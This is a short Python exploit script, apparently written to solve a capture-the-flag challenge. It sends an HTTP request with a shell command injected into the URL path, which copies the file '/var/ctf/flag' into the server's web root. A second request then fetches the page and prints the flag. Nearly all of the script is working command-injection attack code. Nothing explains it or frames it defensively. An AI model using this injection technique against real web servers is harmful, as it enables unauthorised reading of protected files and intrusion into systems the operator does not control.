#!/usr/bin/env python

from socket import *
import sys

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return buf
        buf += newbuf
        count -= len(newbuf)
    return buf



HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 1024
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(ADDR)
except Exception as e:
    print('Cannot connect to the server.')
    sys.exit()

s.send("GET /|cp%20/var/ctf/flag%20./htdocs/index.html HTTP/1.1\r\n\r\n")
s.close()


s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(ADDR)
except Exception as e:
    print('Cannot connect to the server.')
    sys.exit()
s.send("GET / HTTP/1.1\r\n\r\n")
output = recvall(s, BUFSIZE)


output = output.split()
flag = output[-1]
print(flag)
